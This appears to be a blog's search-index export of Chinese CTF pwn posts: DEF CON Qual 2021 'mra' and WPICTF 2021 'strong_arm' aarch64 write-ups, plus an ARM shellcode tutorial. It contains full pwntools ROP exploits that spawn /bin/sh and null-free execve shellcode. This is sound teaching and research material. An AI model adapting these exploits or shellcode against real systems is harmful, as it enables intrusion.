[{"categories":["pwn"],"content":"功能分析 程序是静态链接，并且去掉了符号信息。 $ file mra\rmra: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, stripped\r 题目描述是 Is it odd?，用 IDA 打开发现栈帧分析会出错，看函数序发现栈是向上生长的，确实挺 odd。IDA 没法使用，看了 Writeup 发现可以用 Ghidra。 undefined8 main(undefined4 param_1,undefined8 param_2)\r{\ruint uVar1;\ruint uVar2;\rint iVar3;\rundefined *puVar4;\rundefined *puVar5;\rulong uVar6;\rlong lVar7;\rundefined8 uStack0000000000000010;\rundefined4 uStack000000000000001c;\rundefined8 in_stack_00000020;\rchar cVar8;\rchar *pcVar9;\rchar *pcVar10;\rchar *pcVar11;\ruStack0000000000000010 = param_2;\ruStack000000000000001c = param_1;\rFUN_00401018(PTR_DAT_0041cf60,0,2,0);\rFUN_00401018(PTR_FUN_0041cf58,0,2,0);\rpcVar10 = \"GET /api/isodd/\";\rpcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\";\rcVar8 = '\\0';\rFUN_00405ba0(\u0026stack0x00000028,0,0x400);\rpcVar11 = \"public\";\ruVar2 = FUN_004064f8(0,\u0026stack0x00000028,0x3ff);\rif ((8 \u003c uVar2) \u0026\u0026 (iVar3 = FUN_00405eb0(\u0026stack0x00000028,pcVar10,0xf), iVar3 == 0)) {\rpuVar4 = (undefined *)FUN_00405ca8(\u0026stack0x00000028,10);\rif (puVar4 != (undefined *)0x0) {\r*puVar4 = 0;\rif (puVar4[-1] == '\\r') {\rpuVar4[-1] = '\\0';\r}\r}\rpuVar4 = (undefined *)FUN_00406358(\u0026stack0x00000028,\" HTTP/\");\rif (puVar4 != (undefined *)0x0) {\r*puVar4 = 0;\r}\rpuVar4 = (undefined *)FUN_00405ca8(\u0026stack0x00000028,0x3f);\rif (puVar4 != (undefined *)0x0) {\r*puVar4 = 0;\rpuVar4 = puVar4 + 1;\riVar3 = FUN_00405eb0(puVar4,\"token=\",6);\rif (iVar3 == 0) {\rpcVar11 = puVar4 + 6;\r}\r}\rpuVar4 = \u0026stack0x00000037;\rpuVar5 = (undefined *)FUN_00405ca8(puVar4,0x2f);\rif (puVar5 != (undefined *)0x0) {\r*puVar5 = 0;\r}\ruVar6 = FUN_00405e28(puVar4);\riVar3 = FUN_00405de0(pcVar11,\"enterprise\");\rif (iVar3 == 0) {\rif (0xc \u003c uVar6) {\rFUN_004002c4(0x191,\"{\\n\\t\\\"error\\\": \\\"contact us for unlimited large number support\\\"\\n}\");\rreturn 0;\r}\r}\relse {\riVar3 = FUN_00405de0(pcVar11,\"premium\");\rif (iVar3 == 0) {\rif (9 \u003c uVar6) {\rFUN_004002c4(0x191,\r\"{\\n\\t\\\"error\\\": \\\"sign up for enterprise to get large number support\\\"\\n}\");\rreturn 0;\r}\r}\relse {\rpcVar11 = \"public\";\rif (6 \u003c uVar6) {\rFUN_004002c4(0x191,\r\"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get large number support\\\"\\n}\"\r);\rreturn 0;\r}\r}\r}\riVar3 = FUN_004001d0(\u0026stack0x00000428,puVar4);\rlVar7 = (long)iVar3;\rif ((cVar8 == '-') \u0026\u0026 (iVar3 = FUN_00405de0(pcVar11,\"public\"), iVar3 == 0)) {\rFUN_004002c4(0x191,\r\"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get negative number support\\\"\\n}\"\r);\r}\relse {\ruVar2 = (byte)(\u0026stack0x00000427)[lVar7] - 0x30;\rin_stack_00000020 = 0;\riVar3 = FUN_00405de0(pcVar11,\"public\");\rif (iVar3 == 0) {\ruVar1 = -(uVar2 \u0026 1);\rif (-1 \u003c (int)uVar2) {\ruVar1 = uVar2 \u0026 1;\r}\rif (uVar1 == 1) {\rpcVar11 = \"true\";\r}\relse {\rpcVar11 = \"false\";\r}\rFUN_00400d88(\u0026stack0x00000020,\"{\\n\\t\\\"isodd\\\": %s,\\n\\t\\\"ad\\\": \\\"%s\\\"\\n}\\n\",pcVar11,pcVar9);\r}\relse {\ruVar1 = -(uVar2 \u0026 1);\rif (-1 \u003c (int)uVar2) {\ruVar1 = uVar2 \u0026 1;\r}\rif (uVar1 == 1) {\rpcVar11 = \"true\";\r}\relse {\rpcVar11 = \"false\";\r}\rFUN_00400d88(\u0026stack0x00000020,\"{\\n\\t\\\"isodd\\\": %s\\n}\\n\",pcVar11);\r}\rFUN_004002c4(200,in_stack_00000020);\r}\r}\rreturn 0;\r}\r 因为是静态链接并且去掉了符号，看起来非常头疼，不过可以根据正向编程经验确定一些函数，比如在 main 开头处有 FUN_00401018(PTR_DAT_0041cf60,0,2,0);\rFUN_00401018(PTR_FUN_0041cf58,0,2,0);\rpcVar10 = \"GET /api/isodd/\";\rpcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\";\rcVar8 = '\\0';\rFUN_00405ba0(\u0026stack0x00000028,0,0x400);\rpcVar11 = \"public\";\ruVar2 = FUN_004064f8(0,\u0026stack0x00000028,0x3ff);\r 根据经验不难猜到是 setvbuf，memset 和 read 三个操作。用类似的方法可以得到以下代码： undefined8 main(undefined4 param_1,undefined8 param_2)\r{\ruint uVar1;\ruint uVar2;\rint iVar3;\rundefined *puVar4;\rundefined *puVar5;\rulong uVar6;\rlong lVar7;\rundefined8 uStack0000000000000010;\rundefined4 uStack000000000000001c;\rundefined8 in_stack_00000020;\rchar cVar8;\rchar *pcVar9;\rchar *pcVar10;\rchar *pcVar11;\ruStack0000000000000010 = param_2;\ruStack000000000000001c = param_1;\rsetvbuf(PTR_DAT_0041cf60,0,2,0);\rsetvbuf(PTR_FUN_0041cf58,0,2,0);\rpcVar10 = \"GET /api/isodd/\";\rpcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\";\rcVar8 = '\\0';\rmemset(\u0026stack0x0000","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:1:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"寻找漏洞 用上述方法分析后，我尝试了很久都没能找到漏洞。于是又参考了 Writeup，发现漏洞在 FUN_004001d0 函数中。这里我根据程序逻辑直接把它当作库函数 strcpy 因此没有深入分析。其实正确的做法是根据程序逻辑和函数自身的代码确定它的功能。 int vuln_cpy(long param_1,long param_2)\r{\ruint uVar1;\rlong lStack0000000000000020;\rlong lStack0000000000000028;\rbyte bStack0000000000000037;\rint iStack0000000000000038;\rint iStack000000000000003c;\riStack000000000000003c = 0;\riStack0000000000000038 = 0;\rlStack0000000000000020 = param_2;\rlStack0000000000000028 = param_1;\rwhile (bStack0000000000000037 = *(byte *)(lStack0000000000000020 + iStack000000000000003c),\rbStack0000000000000037 != 0) {\rif (bStack0000000000000037 == '%') {\ruVar1 = FUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 1)\r);\rbStack0000000000000037 =\rFUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 2));\rbStack0000000000000037 = (byte)((uVar1 \u0026 0xff) \u003c\u003c 4) | bStack0000000000000037;\riStack000000000000003c = iStack000000000000003c + 3;\r}\relse {\riStack000000000000003c = iStack000000000000003c + 1;\r}\r*(byte *)(lStack0000000000000028 + iStack0000000000000038) = bStack0000000000000037;\riStack0000000000000038 = iStack0000000000000038 + 1;\r}\rreturn iStack0000000000000038;\r}\r vuln_cpy 用于将字符串从源地址拷贝到目的地址，遇到 % 后会把接下来两个字符作为 16 进制读取，并进行一个 url decode 的操作。不难发现这个函数不会被 %\\x00 这样的模式截断，这样就会绕过 main 中的长度检查造成栈溢出漏洞。 ","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:2:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"漏洞利用 $ checksec ./mra\r[*] '/mnt/c/Users/ay3/Desktop/Archive/ooo/mra/mra'\rArch: aarch64-64-little\rRELRO: Partial RELRO\rStack: No canary found\rNX: NX enabled\rPIE: No PIE (0x400000)\r 找到可用的 gadget： $ aarch64-linux-gnu-objdump -d mra | grep -B10 -A5 svc\r...\r4007b4: f85f83e8 ldur x8, [sp, #-8]\r4007b8: f85f03e0 ldur x0, [sp, #-16]\r4007bc: f85e83e1 ldur x1, [sp, #-24]\r4007c0: f85e03e2 ldur x2, [sp, #-32]\r4007c4: d4000001 svc #0x0\r4007c8: d10083ff sub sp, sp, #0x20\r4007cc: d65f03c0 ret\r...\r 构造 rop 链如下： rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve)\rrop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget)\r 完整 exp 如下： from pwn import *\rimport urllib\rcontext.log_level = 'debug'\rcontext.arch = 'aarch64'\rbinary = ELF('./mra')\r# cmd = 'qemu-aarch64 -g 1234 mra'\r cmd = 'qemu-aarch64 mra'\rp = process(cmd.split())\r# pause()\r # 4007b4: f85f83e8 ldur x8, [sp, #-8]\r # 4007b8: f85f03e0 ldur x0, [sp, #-16]\r # 4007bc: f85e83e1 ldur x1, [sp, #-24]\r # 4007c0: f85e03e2 ldur x2, [sp, #-32]\r # 4007c4: d4000001 svc #0x0\r # 4007c8: d10083ff sub sp, sp, #0x20\r # 4007cc: d65f03c0 ret\r gadget = 0x4007b4\r# p.sendline(b'GET /api/isodd/%\\x00' + cyclic(0x500) + b'HTTP/1.1')\r # offset = cyclic_find(p64(0x61616562616164), n=8)\r rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve)\rrop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget)\rrop = urllib.parse.quote(rop).encode()\rpayload = b'GET /api/isodd/%\\x00'\rpayload += b'a' * 0x28 + rop\rp.send(payload.ljust(0x3ff, b'a'))\rsleep(0.1)\rp.sendline(b'/bin/sh\\x00')\rp.interactive()\r ","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:3:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"文件来源: strong_arm ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:0:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"环境搭建 安装 qemu-user，libc 和 binutils： $ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu\r 发现交叉编译工具链里没有 ldd，可以用 readelf 替代： $ aarch64-linux-gnu-readelf -a arm | grep 'library'\r0x0000000000000001 (NEEDED) Shared library: [libc.so.6]\r 查找 gadget： $ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 \u003e gadget\r$ cat gadget | grep ': ldr x0.*; ldp x29, x30, \\[sp\\], #0x[0-9a-f]*; ret; $'\r ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:1:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"漏洞分析 非常明显的栈溢出漏洞。但需要注意的是 Aarch64 的函数调用栈栈帧结构与 x86 不同。以该题 main 栈帧为例，x29 和 x30 分别是栈基址寄存器和 lr 。可以看到这两个寄存器的值保存在栈顶，然后才是局部变量。栈帧结构与 x86 正好是相反的。因此发生栈溢出的时候能够修改的是 caller 的返回地址。 .text:00000000004006B0 STP X29, X30, [SP,#var_20]!\r.text:00000000004006B4 MOV X29, SP\r.text:00000000004006B8 STR W0, [X29,#0x20+var_4]\r.text:00000000004006BC STR X1, [X29,#0x20+var_10]\r.text:00000000004006C0 ADRP X0, #printf_ptr@PAGE\r.text:00000000004006C4 LDR X1, [X0,#printf_ptr@PAGEOFF]\r.text:00000000004006C8 ADRL X0, aPrintAtP ; \"print at %p\\n\"\r.text:00000000004006D0 BL .printf\r.text:00000000004006D4 BL vulnerable\r.text:00000000004006D8 MOV W0, #0\r.text:00000000004006DC LDP X29, X30, [SP+0x20+var_20],#0x20\r.text:00000000004006E0 RET\r 由于 ret 指令不从栈上取返回地址，而是从 x30 取，因此 rop chain 的构造比 x86 要困难一些。 # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;\r gadget = 0x0000000000063e1c\rpayload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))\r 这里使用的 libc 是 2.31 版本，不过构造方法应该都是一致的。首先填充 vuln 函数的局部变量空间以及 x29 然后是我们的 gadget，然后填充 main 的局部变量空间。在 main 退出时 sp 指向 payload 中偏移为 0xa0 的位置，因此根据我们的 gadget 需要在 0xb8 的位置填上 /bin/sh 地址，再在栈顶填好 x29 和 x30，就可以调用 system(\"/bin/sh\") 了。 完整 exp 如下： from pwn import *\rcontext.log_level = 'debug'\rbinary = ELF('./arm')\rlibc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')\rcmd = 'qemu-aarch64 -L /usr/aarch64-linux-gnu arm'\rp = process(cmd.split(' '))\r# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;\r gadget = 0x0000000000063e1c\rp.recvuntil('print at ')\rleak = int(p.recvline()[:-1], 16)\rlibc.address = leak - libc.sym.printf\rsuccess(hex(libc.address))\rpayload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))\rp.sendline(payload)\rp.interactive()\r ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:2:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"之前一直对 Arm pwn 不了解，但 CTF 中 Arm pwn 出现频率还是挺高的。Defcon qual 2021 也有一道比较简单的 Arm pwn。编写 Shellcode 是漏洞利用的基础，因此从它开始入门 Arm pwn。主要参考 wrting arm shellcode, 系统环境是 azeria lab vm 2.0。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:0:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"系统调用 一般情况下执行 shellcode 的目的是弹出一个shell，即 execve(\"/bin/sh\", 0, 0)。32 bit arm 系统调用号通过 r7传递，参数依次保存在 r0 - r6。汇编代码如下： .section .text\r.global _start\r_start:\radd r0, pc, #12\rmov r1, #0\rmov r2, #0\rmov r7, #11\rsvc #0\r.ascii \"/bin/sh\\0\"\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:1:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"去除 Null Byte 上面的汇编代码经过汇编后得到的机器指令中含有非常多的 null byte，这对 shellcode 来说是非常致命的。因为漏洞函数往往会被 null byte 截断。 $ objdump -d execv\rexecv: file format elf32-littlearm\rDisassembly of section .text:\r00010054 \u003c_start\u003e:\r10054: e28f000c add r0, pc, #12\r10058: e3a01000 mov r1, #0\r1005c: e3a02000 mov r2, #0\r10060: e3a0700b mov r7, #11\r10064: ef000000 svc 0x00000000\r10068: 6e69622f .word 0x6e69622f\r1006c: 0068732f .word 0x0068732f\r 需要注意的是在 x86 架构下 pc 的值是下一条指令的地址，而在 arm 架构中 pc 的值是下下条指令的地址。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"指令部分 对于指令中的 null byte 可以通过使用 Thumb mode 来去除。 .section .text\r.global _start\r_start:\r.code 32\radd r3, pc, #1\rbx r3\r.code 16\radd r0, pc, #8\reor r1, r1, r1\reor r2, r2, r2\rmov r7, #11\rsvc #1\rmov r5, r5\r.ascii \"/bin/sh\\0\"\r 其中 mov r5, r5 用于对齐。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:1","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"字符串部分 上面的汇编代码得到的机器码是不含 null byte 的，但作为参数的字符串末尾却必须包含一个 null byte。解决方法是先在目标位置存放一个任意非 0 的值，然后在运行时将它置 0。 .section .text\r.global _start\r_start:\r.code 32\radd r3, pc, #1\rbx r3\r.code 16\radd r0, pc, #8\reor r1, r1, r1\reor r2, r2, r2\rstrb r2, [r0, #7]\rmov r7, #11\rsvc #1\r.ascii \"/bin/shx\"\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:2","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"测试 Shellcode 链接时默认 .text 段不可写，而 /bin/sh 在 .text 段中。使用 -N 使其可写。 ld --help | grep 'readonly'\r-N, --omagic Do not page align data, do not make text readonly\r--no-omagic Page align data, make text readonly\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:3:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"}]